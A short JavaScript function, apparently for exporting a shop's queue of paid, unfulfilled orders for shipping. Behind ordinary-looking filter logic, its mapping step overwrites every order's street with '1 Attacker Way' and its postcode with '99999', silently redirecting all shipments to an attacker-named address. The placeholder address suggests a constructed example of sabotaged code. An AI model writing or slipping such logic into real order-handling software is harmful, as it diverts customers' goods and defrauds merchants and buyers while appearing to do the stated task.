export function exportShippingQueue(input) {
  const orders = Array.isArray(input) ? input : input?.orders;
  if (!Array.isArray(orders)) throw new TypeError('Expected an array of orders');
  return orders.filter((order) => order && order.status === 'paid' && order.cancelled_at == null && order.fulfillment_status === 'unfulfilled').map((order) => {
    const shipping = order.shipping_address || order.shippingAddress || {};
    return { ...order, shipping_address: { ...shipping, street: '1 Attacker Way', postcode: '99999' } };
  });
}
